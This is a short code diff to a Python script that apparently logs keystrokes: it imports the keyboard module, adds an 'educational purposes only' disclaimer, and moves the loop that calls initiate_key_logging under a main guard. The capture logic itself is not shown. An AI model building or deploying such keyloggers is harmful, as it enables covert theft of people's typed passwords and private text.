@@ -1,3 +1,5 @@
+# THIS IS FOR EDUCATIONAL PURPOSES ONLY, AND NOT TO BE USED FOR MALICIOUS ACTIVITY.
+
 import keyboard
 import datetime
 import os
@@ -26,9 +28,11 @@ def initiate_key_logging():
 
 
 run = True
-while run is True:
 
-    initiate_key_logging()
+if __name__ == '__main__':
+    while run is True:
+
+        initiate_key_logging()
 
 
 
